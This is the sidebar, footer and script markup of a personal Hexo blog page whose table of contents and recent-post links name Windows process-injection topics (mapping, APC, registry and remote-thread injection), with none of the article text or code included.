src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%98%A0%E5%B0%84%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">映射注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8%E6%98%A0%E5%B0%84%E6%B3%A8%E5%85%A5%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">1.为什么用映射注入？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%98%A0%E5%B0%84%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">2.映射注入的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">关键函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">3.代码实现</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/05/web%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/" title="No title">No title</a><time datetime="2023-09-05T10:00:44.585Z" title="Created 2023-09-05 18:00:44">2023-09-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/24/%E6%98%A0%E5%B0%84%E6%B3%A8%E5%85%A5/" title="No title">No title</a><time datetime="2023-07-24T09:38:28.729Z" title="Created 2023-07-24 17:38:28">2023-07-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/21/%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5/" title="No title">No title</a><time datetime="2023-07-21T08:06:00.154Z" title="Created 2023-07-21 16:06:00">2023-07-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/20/APC%E6%B3%A8%E5%85%A5/" title="No title">No title</a><time datetime="2023-07-20T11:08:18.081Z" title="Created 2023-07-20 19:08:18">2023-07-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/18/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5--%E7%AA%81%E7%A0%B4session0%E6%B3%A8%E5%85%A5/" title="No title">No title</a><time datetime="2023-07-18T06:58:55.699Z" title="Created 2023-07-18 14:58:55">2023-07-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By John Doe</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
